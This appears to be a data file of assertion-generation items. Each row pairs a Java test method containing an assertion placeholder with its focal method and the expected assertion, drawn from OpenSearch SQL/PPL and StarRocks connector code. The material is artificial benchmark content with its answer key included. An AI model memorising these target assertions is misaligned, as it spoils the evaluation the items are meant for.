toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"addRequestId_alreadyExists() {  QueryContext.addRequestId(); final String requestId = ThreadContext.get(REQUEST_ID_KEY); QueryContext.addRequestId(); final String requestId2 = ThreadContext.get(REQUEST_ID_KEY); Assert.""<AssertPlaceHolder>""; }
addRequestId() { var id = UUID.randomUUID().toString(); ThreadContext.put(REQUEST_ID_KEY, id); return id; }"	assertThat(requestId2, not(equalTo(requestId)))
"getRequestId_doesNotExist() { ""<AssertPlaceHolder>""; }
getRequestId() { var id = ThreadContext.get(REQUEST_ID_KEY); if (null == id) { id = addRequestId(); } return id; }"	assertNotNull(QueryContext.getRequestId())
"getRequestId() {  final String test_request_id = ""test_id_111""; ThreadContext.put(REQUEST_ID_KEY, test_request_id); final String requestId = QueryContext.getRequestId(); Assert.""<AssertPlaceHolder>""; }
getRequestId() { var id = ThreadContext.get(REQUEST_ID_KEY); if (null == id) { id = addRequestId(); } return id; }"	assertThat(requestId, equalTo(test_request_id))
"queriesShouldHaveAnonymousFieldAndIndex() { String query = ""SELECT ABS(balance) FROM accounts WHERE age > 30 GROUP BY ABS(balance)""; String expectedQuery = ""( SELECT ABS(identifier) FROM table WHERE identifier > number GROUP BY ABS(identifier) )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesShouldAnonymousNumbers() { String query = ""SELECT ABS(20), LOG(20.20) FROM accounts""; String expectedQuery = ""( SELECT ABS(number), LOG(number) FROM table )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesShouldHaveAnonymousBooleanLiterals() { String query = ""SELECT TRUE FROM accounts""; String expectedQuery = ""( SELECT boolean_literal FROM table )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesShouldHaveAnonymousInputStrings() { String query = ""SELECT * FROM accounts WHERE name = 'Oliver'""; String expectedQuery = ""( SELECT * FROM table WHERE identifier = 'string_literal' )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesWithAliasesShouldAnonymizeSensitiveData() { String query = ""SELECT balance AS b FROM accounts AS a""; String expectedQuery = ""( SELECT identifier AS b FROM table a )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesWithFunctionsShouldAnonymizeSensitiveData() { String query = ""SELECT LTRIM(firstname) FROM accounts""; String expectedQuery = ""( SELECT LTRIM(identifier) FROM table )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesWithAggregatesShouldAnonymizeSensitiveData() { String query = ""SELECT MAX(price) - MIN(price) from tickets""; String expectedQuery = ""( SELECT MAX(identifier) - MIN(identifier) FROM table )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"queriesWithSubqueriesShouldAnonymizeSensitiveData() { String query = ""SELECT a.f, a.l, a.a FROM "" + ""(SELECT firstname AS f, lastname AS l, age AS a FROM accounts WHERE age > 30) a""; String expectedQuery = ""( SELECT identifier, identifier, identifier FROM (SELECT identifier AS f, "" + ""identifier AS l, identifier AS a FROM table WHERE identifier > number ) a )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"joinQueriesShouldAnonymizeSensitiveData() { String query = ""SELECT a.account_number, a.firstname, a.lastname, e.id, e.name "" + ""FROM accounts a JOIN employees e""; String expectedQuery = ""( SELECT identifier, identifier, identifier, identifier, identifier "" + ""FROM table a JOIN table e )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"unionQueriesShouldAnonymizeSensitiveData() { String query = ""SELECT name, age FROM accounts UNION SELECT name, age FROM employees""; String expectedQuery = ""( SELECT identifier, identifier FROM table "" + ""UNION SELECT identifier, identifier FROM table )""; Assert.""<AssertPlaceHolder>""; }
anonymizeData(String query) { String resultQuery; try { AnonymizeSensitiveDataRule rule = new AnonymizeSensitiveDataRule(); SQLQueryExpr sqlExpr = (SQLQueryExpr) toSqlExpr(query); rule.rewrite(sqlExpr); resultQuery = SQLUtils.toMySqlString(sqlExpr) .replaceAll(""0"", ""number"") .replaceAll(""false"", ""boolean_literal"") .replaceAll(""[\\n][\\t]+"", "" ""); } catch (Exception e) { LOG.warn(""Caught an exception when anonymizing sensitive data.""); LOG.debug(""String {} failed anonymization."", query); resultQuery = ""Failed to anonymize data.""; } return resultQuery; }"	assertEquals(expectedQuery, QueryDataAnonymizer.anonymizeData(query))
"testAbsWithIntReturnType() { final SQLIntegerExpr sqlIntegerExpr = new SQLIntegerExpr(6);  final SQLMethodInvokeExpr invokeExpr = new SQLMethodInvokeExpr(""ABS""); invokeExpr.addParameter(sqlIntegerExpr); List<KVValue> params = new ArrayList<>();  final MethodField field = new ScriptMethodField(""ABS"", params, null, null); field.setExpression(invokeExpr); ColumnTypeProvider columnTypeProvider = new ColumnTypeProvider(OpenSearchDataType.INTEGER);  Schema.Type resolvedType = columnTypeProvider.get(0); final Schema.Type returnType = sqlFunctions.getScriptFunctionReturnType(field, resolvedType); Assert.""<AssertPlaceHolder>""; }
getScriptFunctionReturnType( MethodField field, Schema.Type resolvedType) { String functionName = ((ScriptMethodField) field).getFunctionName().toLowerCase(); if (functionName.equals(""cast"")) { String castType = ((SQLCastExpr) field.getExpression()).getDataType().getName(); return getCastFunctionReturnType(castType); } return resolvedType; }"	assertEquals(returnType, Schema.Type.INTEGER)
"testCastReturnType() { final SQLIdentifierExpr identifierExpr = new SQLIdentifierExpr(""int_type""); SQLDataType sqlDataType = new SQLDataTypeImpl(""INT""); final SQLCastExpr castExpr = new SQLCastExpr(); castExpr.setExpr(identifierExpr); castExpr.setDataType(sqlDataType);  List<KVValue> params = new ArrayList<>(); final MethodField field = new ScriptMethodField(""CAST"", params, null, null); field.setExpression(castExpr); ColumnTypeProvider columnTypeProvider = new ColumnTypeProvider(OpenSearchDataType.INTEGER);  Schema.Type resolvedType = columnTypeProvider.get(0); final Schema.Type returnType = sqlFunctions.getScriptFunctionReturnType(field, resolvedType); Assert.""<AssertPlaceHolder>""; }
getScriptFunctionReturnType( MethodField field, Schema.Type resolvedType) { String functionName = ((ScriptMethodField) field).getFunctionName().toLowerCase(); if (functionName.equals(""cast"")) { String castType = ((SQLCastExpr) field.getExpression()).getDataType().getName(); return getCastFunctionReturnType(castType); } return resolvedType; }"	assertEquals(returnType, Schema.Type.INTEGER)
"clearEmptyPaths_EmptyMap_ShouldReturnTrue() { Map<String, Object> map = new HashMap<>(); boolean result = Util.clearEmptyPaths(map); // Assert.""<AssertPlaceHolder>""; }
clearEmptyPaths(Map<String, Object> map) { if (map.size() == 0) { return true; } Set<String> keysToDelete = new HashSet<>(); for (Map.Entry<String, Object> entry : map.entrySet()) { Object value = entry.getValue(); if (Map.class.isAssignableFrom(value.getClass())) { if (clearEmptyPaths((Map<String, Object>) value)) { keysToDelete.add(entry.getKey()); } } } if (keysToDelete.size() != 0) { if (map.size() == keysToDelete.size()) { map.clear(); return true; } for (String key : keysToDelete) { // TODO: seems like a bug, either fix, or just get rid of for loop and remove the first key map.remove(key); return false; } } return false; }"	assertTrue(result)
"clearEmptyPaths_2PathsOneEmpty_MapShouldBeSizeOne() { Map<String, Object> map = new HashMap<>(); map.put(""a"", new HashMap<String, Object>()); map.put(""c"", 1); Util.clearEmptyPaths(map); Assert.""<AssertPlaceHolder>""; }
clearEmptyPaths(Map<String, Object> map) { if (map.size() == 0) { return true; } Set<String> keysToDelete = new HashSet<>(); for (Map.Entry<String, Object> entry : map.entrySet()) { Object value = entry.getValue(); if (Map.class.isAssignableFrom(value.getClass())) { if (clearEmptyPaths((Map<String, Object>) value)) { keysToDelete.add(entry.getKey()); } } } if (keysToDelete.size() != 0) { if (map.size() == keysToDelete.size()) { map.clear(); return true; } for (String key : keysToDelete) { // TODO: seems like a bug, either fix, or just get rid of for loop and remove the first key map.remove(key); return false; } } return false; }"	assertEquals(1, map.size())
"testValidate() { TransportPPLQueryRequest request = new TransportPPLQueryRequest(""source=t a=1"", null, null); ""<AssertPlaceHolder>""; }
validate() { return null; }"	assertNull(request.validate())
"testTransportPPLQueryRequestFromActionRequest() { TransportPPLQueryRequest request = new TransportPPLQueryRequest(""source=t a=1"", null, null); ""<AssertPlaceHolder>""; }
fromActionRequest(final ActionRequest actionRequest) { if (actionRequest instanceof TransportPPLQueryRequest) { return (TransportPPLQueryRequest) actionRequest; }  try (ByteArrayOutputStream baos = new ByteArrayOutputStream(); OutputStreamStreamOutput osso = new OutputStreamStreamOutput(baos)) { actionRequest.writeTo(osso); try (InputStreamStreamInput input = new InputStreamStreamInput(new ByteArrayInputStream(baos.toByteArray()))) { return new TransportPPLQueryRequest(input); } } catch (IOException e) { throw new IllegalArgumentException( ""failed to parse ActionRequest into TransportPPLQueryRequest"", e); } }"	assertEquals(TransportPPLQueryRequest.fromActionRequest(request), request)
"testFromActionResponseSameClassloader() { TransportPPLQueryResponse response1 = new TransportPPLQueryResponse(""mock result""); TransportPPLQueryResponse response2 = TransportPPLQueryResponse.fromActionResponse(response1); ""<AssertPlaceHolder>""; }
fromActionResponse(ActionResponse actionResponse) { if (actionResponse instanceof TransportPPLQueryResponse) { return (TransportPPLQueryResponse) actionResponse; }  try (ByteArrayOutputStream baos = new ByteArrayOutputStream(); OutputStreamStreamOutput osso = new OutputStreamStreamOutput(baos)) { actionResponse.writeTo(osso); try (StreamInput input = new InputStreamStreamInput(new ByteArrayInputStream(baos.toByteArray()))) { return new TransportPPLQueryResponse(input); } } catch (IOException e) { throw new UncheckedIOException( ""failed to parse ActionResponse into TransportPPLQueryResponse"", e); } }"	assertEquals(response1.getResult(), response2.getResult())
"testExplainRequest() { PPLQueryRequest request = new PPLQueryRequest(""source=t a=1"", null, ""/_plugins/_ppl/_explain""); ""<AssertPlaceHolder>""; }
isExplainRequest() { return path.endsWith(""/_explain""); }"	assertTrue(request.isExplainRequest())
"testDefaultFormat() { PPLQueryRequest request = new PPLQueryRequest(""source=test"", null, ""/_plugins/_ppl""); ""<AssertPlaceHolder>""; }
format() { Optional<Format> optionalFormat = Format.of(format); if (optionalFormat.isPresent()) { return optionalFormat.get(); } else { throw new IllegalArgumentException( String.format(Locale.ROOT, ""response in %s format is not supported."", format)); } }"	assertEquals(request.format(), Format.JDBC)
"testJDBCFormat() { PPLQueryRequest request = new PPLQueryRequest(""source=test"", null, ""/_plugins/_ppl"", ""jdbc""); ""<AssertPlaceHolder>""; }
format() { Optional<Format> optionalFormat = Format.of(format); if (optionalFormat.isPresent()) { return optionalFormat.get(); } else { throw new IllegalArgumentException( String.format(Locale.ROOT, ""response in %s format is not supported."", format)); } }"	assertEquals(request.format(), Format.JDBC)
"testCSVFormat() { PPLQueryRequest request = new PPLQueryRequest(""source=test"", null, ""/_plugins/_ppl"", ""csv""); ""<AssertPlaceHolder>""; }
format() { Optional<Format> optionalFormat = Format.of(format); if (optionalFormat.isPresent()) { return optionalFormat.get(); } else { throw new IllegalArgumentException( String.format(Locale.ROOT, ""response in %s format is not supported."", format)); } }"	assertEquals(request.format(), Format.CSV)
"addProjectForRenameOperator() { Rename rename = Mockito.mock(Rename.class);  UnresolvedPlan plan = UnresolvedPlanHelper.addSelectAll(rename); ""<AssertPlaceHolder>""; }
addSelectAll(UnresolvedPlan plan) { if ((plan instanceof Project) && !((Project) plan).isExcluded()) { return plan; } else { return new Project(ImmutableList.of(AllFields.of())).attach(plan); } }"	assertTrue(plan instanceof Project)
"SQLException { Customer cus = new Customer(); cus.setUsername(""1003""); cus.setPassword(""admin""); cus.setEmail(""cus1003""); ""<AssertPlaceHolder>""; }
addCustomer(Customer customer) throws SQLException { String sql = ""insert into Customer values(?, ?, ?)""; Object[] params = {customer.getUsername(), customer.getPassword(), customer.getEmail()}; return modifyObj(sql, params); }"	assertEquals(1, cusDAO.addCustomer(cus))
"Exception { String tableName = createPkTable(""test_read_write"");  StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); StreamTableEnvironment tEnv = StreamTableEnvironment.create(env); env.setParallelism(1);  String catalogName = ""test_catalog""; String createCatalogSql = String.format( ""CREATE CATALOG %s WITH ("" + ""       'type' = 'starrocks',\n"" + ""       'jdbc-url' = '%s',\n"" + ""       'http-url' = '%s',\n"" + ""       'username' = '%s',\n"" + ""       'password' = '%s',\n"" + ""       'default-database' = '%s'"" + "");"", catalogName, getJdbcUrl(), getHttpUrls(), ""root"", """", ""default-db""); tEnv.executeSql(createCatalogSql); tEnv.executeSql(String.format(""USE CATALOG %s;"", catalogName)); tEnv.executeSql(String.format(""USE %s;"", DB_NAME)); tEnv.executeSql( String.format( ""INSERT INTO %s VALUES (1, '100'), (2, '200');"", tableName )) .await();  List<Row> results = CollectionUtil.iteratorToList( tEnv.sqlQuery( String.format( ""SELECT * FROM %s"", tableName)) .execute() .collect()); results.sort(Comparator.comparingInt(row -> (int) row.getField(0)));  List<Row> expectRows = Arrays.asList( Row.ofKind(RowKind.INSERT, 1, ""100""), Row.ofKind(RowKind.INSERT, 2, ""200"") );  ""<AssertPlaceHolder>""; }
getJdbcUrl() { return jdbcUrl; }"	assertThat(results).isEqualTo(expectRows)
"IOException { mockTableStructure(); mockStarRocksVersion(null); long maxRows = OPTIONS.getSinkMaxRows(); stopHttpServer(); try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); for (int i = 0; i < maxRows - 1; i++) { mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), ""test record""); } } catch (Exception e) { throw e; } String exMsg = """"; try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); mgr.startAsyncFlushing(); for (int i = 0; i < maxRows * 3; i++) { mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), ""test record""+i); } mgr.flush(null, true); mgr.close(); } catch (Exception e) { exMsg = e.getMessage(); } ""<AssertPlaceHolder>""; }
close() { if (!closed) { closed = true;  LOG.info(""StarRocks Sink is about to close, loadMetrics: {}."", metricsToString()); this.bufferMap.clear();  if (scheduledFuture != null) { scheduledFuture.cancel(false); scheduler.shutdown(); } if (jdbcConnProvider != null) { jdbcConnProvider.close(); }  offerEOF(); } checkFlushException(); }"	assertTrue(0 < exMsg.length())
"IOException { mockTableStructure(); mockStarRocksVersion(null); long maxSize = OPTIONS.getSinkMaxBytes(); stopHttpServer(); int rowLength = 100000; try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); for (int i = 0; i < maxSize / rowLength - 1; i++) { mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), new String(new char[rowLength])); } } catch (Exception e) { throw e; } String exMsg = """"; try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); mgr.startAsyncFlushing(); for (int i = 0; i < maxSize / rowLength + 1; i++) { mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), new String(new char[rowLength])); } mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), new String(new char[rowLength])); mgr.flush(null, true); mgr.close(); } catch (Exception e) { exMsg = e.getMessage(); } ""<AssertPlaceHolder>""; }
close() { if (!closed) { closed = true;  LOG.info(""StarRocks Sink is about to close, loadMetrics: {}."", metricsToString()); this.bufferMap.clear();  if (scheduledFuture != null) { scheduledFuture.cancel(false); scheduler.shutdown(); } if (jdbcConnProvider != null) { jdbcConnProvider.close(); }  offerEOF(); } checkFlushException(); }"	assertTrue(0 < exMsg.length())
"IOException { mockTableStructure(); mockStarRocksVersion(null); int maxRetries = OPTIONS.getSinkMaxRetries(); if (maxRetries <= 0) return; stopHttpServer(); mockSuccessResponse(); String exMsg = """"; try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); mgr.startAsyncFlushing(); for (int i = 0; i < OPTIONS.getSinkMaxRows(); i++) { mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), """"); } mgr.flush(null, true); mgr.close(); } catch (Exception e) { exMsg = e.getMessage(); } ""<AssertPlaceHolder>""; }
close() { if (!closed) { closed = true;  LOG.info(""StarRocks Sink is about to close, loadMetrics: {}."", metricsToString()); this.bufferMap.clear();  if (scheduledFuture != null) { scheduledFuture.cancel(false); scheduler.shutdown(); } if (jdbcConnProvider != null) { jdbcConnProvider.close(); }  offerEOF(); } checkFlushException(); }"	assertTrue(0 < exMsg.length())
"testLabelExist() { mockTableStructure(); mockStarRocksVersion(null); mockLabelExistsResponse(new String[]{""PREPARE"", ""VISIBLE""}); String exMsg = """"; try { StarRocksSinkManager mgr = new StarRocksSinkManager(OPTIONS, TABLE_SCHEMA); mgr.startAsyncFlushing(); mgr.writeRecords(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), """"); mgr.flush(null, true); mgr.close(); } catch (Exception e) { exMsg = e.getMessage(); } ""<AssertPlaceHolder>""; }
close() { if (!closed) { closed = true;  LOG.info(""StarRocks Sink is about to close, loadMetrics: {}."", metricsToString()); this.bufferMap.clear();  if (scheduledFuture != null) { scheduledFuture.cancel(false); scheduler.shutdown(); } if (jdbcConnProvider != null) { jdbcConnProvider.close(); }  offerEOF(); } checkFlushException(); }"	assertTrue(0 == exMsg.length())
"IOException { final String delimiter = ""\\x02""; OPTIONS.getSinkStreamLoadProperties().put(""row_delimiter"", delimiter); StarRocksISerializer serializer = StarRocksSerializerFactory.createSerializer(OPTIONS, TABLE_SCHEMA.getFieldNames()); List<Object[]> originRows = Arrays.asList( new Object[]{1,""222"",333.1,true}, new Object[]{2,""333"",444.2,false} ); List<byte[]> rows = originRows.stream() .map(vals -> serializer.serialize(vals).getBytes(StandardCharsets.UTF_8)) .collect(Collectors.toList()); String data = new String(joinRows(rows, rows.stream().collect(Collectors.summingInt(r -> r.length)))); String[] parsedRows = data.split(delimiter); ""<AssertPlaceHolder>""; }
serialize(Object[] values) { StringBuilder sb = new StringBuilder(); int idx = 0; for (Object val : values) { sb.append(null == val ? ""\\N"" : ((val instanceof Map || val instanceof List) ? jsonWrapper.toJSONString(val) : val)); if (idx++ < values.length - 1) { sb.append(columnSeparator); } } return sb.toString(); }"	assertEquals(rows.size(), parsedRows.length)
"IOException { stopHttpServer(); StarRocksStreamLoadVisitor visitor = new StarRocksStreamLoadVisitor(OPTIONS, TABLE_SCHEMA.getFieldNames(), true); // test failed String exMsg = """"; try { mockFailedResponse(); StarRocksSinkBufferEntity entity = new StarRocksSinkBufferEntity(OPTIONS.getDatabaseName(), OPTIONS.getTableName(), OPTIONS.getLabelPrefix()); entity.addToBuffer(""aaaa"".getBytes()); visitor.doStreamLoad(entity); } catch (Exception e) { exMsg = e.getLocalizedMessage(); } ""<AssertPlaceHolder>""; }
doStreamLoad(StarRocksSinkBufferEntity bufferEntity) throws IOException { String host = getAvailableHost(); if (null == host) { throw new IOException(""None of the hosts in `load_url` could be connected.""); } String loadUrl = new StringBuilder(host) .append(""/api/"") .append(bufferEntity.getDatabase()) .append(""/"") .append(bufferEntity.getTable()) .append(""/_stream_load"") .toString(); LOG.info(String.format(""Start to join batch data: label[%s]."", bufferEntity.getLabel())); Map<String, Object> loadResult = doHttpPut(loadUrl, bufferEntity.getLabel(), joinRows(bufferEntity.getBuffer(),  (int) bufferEntity.getBatchSize())); final String keyStatus = ""Status""; if (null == loadResult || !loadResult.containsKey(keyStatus)) { throw new IOException(""Unable to flush data to StarRocks: unknown result status, usually caused by: 1.authorization or permission related problems. 2.Wrong column_separator or row_delimiter. 3.Column count exceeded the limitation.""); } if (LOG.isDebugEnabled()) { LOG.debug(String.format(""Stream Load response: \n%s\n"", jsonWrapper.toJSONString(loadResult))); } if (RESULT_FAILED.equals(loadResult.get(keyStatus))) { Map<String, String> logMap = new HashMap<>(); if (loadResult.containsKey(""ErrorURL"")) { logMap.put(""streamLoadErrorLog"", getErrorLog((String) loadResult.get(""ErrorURL""))); } throw new StarRocksStreamLoadFailedException(String.format(""Failed to flush data to StarRocks, Error "" + ""response: \n%s\n%s\n"", jsonWrapper.toJSONString(loadResult), jsonWrapper.toJSONString(logMap)), loadResult); } else if (RESULT_LABEL_EXISTED.equals(loadResult.get(keyStatus))) { LOG.error(String.format(""Stream Load response: \n%s\n"", jsonWrapper.toJSONString(loadResult))); // has to block-checking the state to get the final result checkLabelState(host, bufferEntity.getLabel()); } return loadResult; }"	"assertEquals(0, exMsg.indexOf(""None of the host""))"
"Exception { String entityContent = ""{\n"" + ""    ""TxnId"": 22736752,\n"" + ""    ""Label"": ""119d4ca5-a920-4dbb-84ad-64e062a449c5"",\n"" + ""    ""Status"": ""Success"",\n"" + ""    ""Message"": ""OK"",\n"" + ""    ""NumberTotalRows"": 93,\n"" + ""    ""NumberLoadedRows"": 93,\n"" + ""    ""NumberFilteredRows"": 0,\n"" + ""    ""NumberUnselectedRows"": 0,\n"" + ""    ""LoadBytes"": 17227,\n"" + ""    ""LoadTimeMs"": 17575,\n"" + ""    ""BeginTxnTimeMs"": 0,\n"" + ""    ""StreamLoadPlanTimeMs"": 1,\n"" + ""    ""ReadDataTimeMs"": 0,\n"" + ""    ""WriteDataTimeMs"": 17487,\n"" + ""    ""CommitAndPublishTimeMs"": 86\n"" + ""}"";  ObjectMapper objectMapper = new ObjectMapper(); // StreamLoadResponseBody does not contain all fields returned by StarRocks objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false); // filed names in StreamLoadResponseBody are case-insensitive objectMapper.configure(MapperFeature.ACCEPT_CASE_INSENSITIVE_PROPERTIES, true); StreamLoadResponse.StreamLoadResponseBody responseBody = objectMapper.readValue(entityContent, StreamLoadResponse.StreamLoadResponseBody.class);  Assert.""<AssertPlaceHolder>""; }
getStreamLoadPlanTimeMs() { return streamLoadPlanTimeMs; }"	assertNotNull(responseBody.getStreamLoadPlanTimeMs())
"Exception { Settings settings = new PropertiesSettings(); settings.setProperty(STARROCKS_TABLE_IDENTIFIER, ""a.b""); settings.setProperty(STARROCKS_FENODES, ""fe"");  String expected = ""http://fe/api/a/b/""; Assert.""<AssertPlaceHolder>""; }
getUriStr(Settings cfg, Logger logger) throws IllegalArgumentException { String[] identifier = parseIdentifier(cfg.getProperty(STARROCKS_TABLE_IDENTIFIER), logger); String endPoint = randomEndpoint(cfg.getProperty(STARROCKS_FENODES), logger); if (!endPoint.startsWith(""http"")) { endPoint = ""http://"" + endPoint; } return endPoint + API_PREFIX + ""/"" + identifier[0] + ""/"" + identifier[1] + ""/""; }"	assertEquals(expected, RestService.getUriStr(settings, logger))
